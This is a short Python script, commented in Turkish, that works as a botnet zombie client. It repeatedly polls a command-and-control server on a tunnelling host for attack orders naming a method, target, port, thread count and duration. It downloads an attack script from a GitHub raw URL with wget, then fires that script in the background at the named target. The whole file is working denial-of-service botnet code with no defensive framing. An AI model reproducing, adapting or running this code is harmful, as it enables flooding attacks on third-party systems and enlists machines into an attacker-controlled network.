#!/usr/bin/env python3
import os
import time
import requests
import subprocess

# --- AYARLAR ---
MASTER_URL = "https://shy-otters-trade.loca.lt" 
ZOMBI_AD = f"Zombi-{os.uname()[1]}"

def komut_dinle():
    print(f"🚀 {ZOMBI_AD} orduda göreve hazır!")
    print(f"📡 Beyin: {MASTER_URL}")
    
    while True:
        try:
            headers = {'bypass-tunnel-reminder': 'true', 'User-Agent': 'Zombi-V2'}
            response = requests.get(f"{MASTER_URL}/get_command", headers=headers, timeout=15)
            
            if response.status_code == 200:
                data = response.json()
                
                method = data.get("method")
                target = data.get("target")
                port = data.get("port", 80)
                sure = data.get("duration", 60)
                
                # --- AKILLI THREAD AYARI ---
                # Panelden gelirse onu kullan, gelmezse varsayılan 200 vur!
                thread_verisi = data.get("threads")
                t = thread_verisi if thread_verisi else 200

                if method and target:
                    print(f"\n[!] EMİR: {method.upper()} -> {target}:{port}")
                    print(f"🌪️ Thread: {t} | 🕒 Süre: {sure}s")

                    # Attack.py'nin orada olduğundan emin ol
                    if not os.path.exists("attack.py"):
                        os.system("wget https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/attack.py")

                    # Komutu tam sırasıyla hazırlıyoruz: method target port thread sure
                    attack_cmd = [
                        "python3", "attack.py", 
                        str(method), str(target), str(port), 
                        str(t), str(sure)
                    ]
                    
                    # Arka planda ateşle
                    with open("attack.log", "a") as log_file:
                        subprocess.Popen(attack_cmd, stdout=log_file, stderr=log_file)
                    
                    print(f"✅ SALDIRI BAŞLADI!")

            time.sleep(5)
            
        except Exception as e:
            print(f"⚠️ Hata: {e}")
            time.sleep(10)

if __name__ == "__main__":
    os.system("chmod +x attack.py slave.py")
    komut_dinle()
